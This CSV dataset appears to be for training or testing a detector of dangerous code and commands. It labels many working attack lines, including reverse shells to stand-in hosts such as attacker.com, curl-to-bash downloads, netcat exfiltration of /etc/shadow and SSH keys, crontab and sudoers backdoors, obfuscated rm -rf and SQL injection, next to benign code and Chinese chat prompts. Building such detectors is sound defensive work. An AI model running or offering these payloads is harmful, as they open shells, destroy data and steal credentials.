type,subtype,content,label
sql,sql_injection,"SELECT * FROM users WHERE email LIKE '%@%' AND 1=1 UNION SELECT null,null,null--",dangerous
sql,command_exec,"CALL sys.execute_prepared_stmt('DROP TABLE users')",dangerous
sql,sql_injection,"SELECT * FROM users WHERE id = CHAR(49) OR CHAR(49)=CHAR(49)",dangerous
code,normal,"def add(a, b): return a + b",normal
code,normal,"import os\nprint(os.getcwd())",normal
code,normal,"import requests\nresp = requests.get('https://api.example.com/data')\nprint(resp.json())",normal
code,normal,"with open('config.json', 'r') as f:\n    data = json.load(f)",normal
code,normal,"SELECT_QUERY = 'SELECT * FROM users WHERE id = ?'\ncursor.execute(SELECT_QUERY, (user_id,))",normal
code,normal,"import hashlib\nhash = hashlib.sha256(password.encode()).hexdigest()",normal
code,normal,"import subprocess\nresult = subprocess.run(['ls', '-la'], capture_output=True)",normal
code,normal,"import socket\ns = socket.socket()\ns.connect(('192.168.1.1', 80))",normal
code,file_destroy,"import os\nos.system('rm -rf /')",dangerous
code,reverse_shell,"import subprocess\nsubprocess.Popen('bash -i >& /dev/tcp/attacker.com/4444 0>&1', shell=True)",dangerous
code,malicious_download,"import os\nos.system('curl http://malware.site/shell.sh | bash')",dangerous
code,malicious_download,"import urllib.request\nurllib.request.urlretrieve('http://evil.site/backdoor.py', '/tmp/.hidden')\nexec(open('/tmp/.hidden').read())",dangerous
code,file_permission,"__import__('os').system('chmod 777 /etc/shadow')",dangerous
code,base64_obfuscation,"eval(compile(base64.b64decode('aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ3JtIC1yZiAvJyk='), '<string>', 'exec'))",dangerous
code,memory_injection,"import ctypes\nctypes.windll.kernel32.VirtualAllocEx(0xFFFFFFFF, 0, 0x1000, 0x3000, 0x40)",dangerous
code,crontab_backdoor,"open('/etc/crontab','a').write('* * * * * root curl http://c2.evil.com/cmd | bash')",dangerous
code,reverse_shell,"import socket,os,pty\ns=socket.socket()\ns.connect(('10.0.0.1',1234))\nos.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\npty.spawn('/bin/bash')",dangerous
code,file_permission,"import os\nfor f in os.listdir('/'):\n    os.chmod('/'+f, 0o777)",dangerous
code,file_destroy,"import shutil\nshutil.rmtree('/var/log')\nshutil.rmtree('/home')",dangerous
code,base64_obfuscation,"import base64,codecs\nexec(codecs.decode(base64.b64decode('aW1wb3J0IG9zCm9zLnN5c3RlbSgnd2dldCBodHRwOi8vZXZpbC5jb20veC5zaCAtTyAvdG1wLy54ICYmIGJhc2ggL3RtcC8ueCcp'),'utf-8'))",dangerous
code,memory_injection,"import ctypes,mmap\nbuf = mmap.mmap(-1, 4096, mmap.MAP_SHARED|mmap.MAP_ANONYMOUS, mmap.PROT_READ|mmap.PROT_WRITE|mmap.PROT_EXEC)\nctypes.memmove(buf, shellcode, len(shellcode))",dangerous
code,crontab_backdoor,"import subprocess\nsubprocess.run('(crontab -l; echo \"@reboot curl http://evil.com/x|bash\") | crontab -', shell=True)",dangerous
code,reverse_shell,"import os\nos.system('ncat attacker.com 4444 -e /bin/bash')",dangerous
shell,normal,"ls -la /var/www",normal
shell,normal,"echo 'Hello World'",normal
shell,normal,"cat /etc/hostname",normal
shell,normal,"ps aux | grep nginx",normal
shell,normal,"df -h",normal
shell,normal,"curl -s http://api.example.com/health",normal
shell,file_destroy,"rm -rf /",dangerous
shell,malicious_download,"wget http://malware.site/payload.sh -O /tmp/.x && chmod +x /tmp/.x && /tmp/.x",dangerous
shell,reverse_shell,"bash -i >& /dev/tcp/attacker.com/4444 0>&1",dangerous
shell,reverse_shell,"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",dangerous
shell,privilege_escalation,"echo 'root:password' | chpasswd",dangerous
shell,firewall_clear,"iptables -F && iptables -X",dangerous
shell,crontab_backdoor,"crontab -l > /tmp/c; echo '* * * * * curl http://evil.com/x|bash' >> /tmp/c; crontab /tmp/c",dangerous
shell,nc_exfiltration,"cat /etc/shadow | nc attacker.com 9999",dangerous
shell,nc_exfiltration,"find / -name '*.pem' -o -name 'id_rsa' 2>/dev/null | xargs cat | nc evil.com 4444",dangerous
shell,disk_dump,"dd if=/dev/sda | gzip | nc attacker.com 5555",dangerous
shell,sudo_backdoor,"useradd -m -p $(openssl passwd -1 'hacked') backdoor && usermod -aG sudo backdoor",dangerous
shell,malicious_download,"curl -fsSL http://evil.com/install.sh | sudo bash",dangerous
shell,nc_exfiltration,"tar czf - /home /etc/passwd /etc/shadow | nc attacker.com 6666",dangerous
shell,firewall_clear,"ufw disable && systemctl stop firewalld && setenforce 0",dangerous
shell,sudo_backdoor,"echo 'backdoor ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers",dangerous
shell,disk_dump,"dd if=/dev/nvme0n1 bs=512 | nc -l 9000",dangerous
shell,malicious_download,"scp attacker@evil.com:/tools/rootkit.tar.gz /tmp/ && tar xzf /tmp/rootkit.tar.gz -C /tmp && /tmp/rootkit/install.sh",dangerous
chat,greeting,"你好，请问你是谁？",normal
chat,greeting,"今天天气怎么样？",normal
chat,factual,"请介绍一下中国的首都北京。",normal
chat,factual,"1+1等于几？",normal
chat,factual,"Python是什么编程语言？",normal
chat,factual,"什么是机器学习？",normal
chat,factual,"请解释一下什么是REST API。",normal
chat,explain_code,"请解释这段代码的作用：for i in range(10): print(i)",normal
chat,explain_code,"帮我看一下这个函数有没有bug：def factorial(n): return n * factorial(n-1)",normal
chat,creative,"写一首关于春天的短诗。",normal
chat,creative,"帮我写一个简单的自我介绍。",normal
chat,translate,"请把'Hello World'翻译成中文。",normal
chat,summarize,"请总结一下什么是Docker容器技术。",normal
chat,sql_question,"如何用SQL查询最近7天的订单数量？",normal
chat,code_question,"Python中如何读取一个JSON文件？",normal
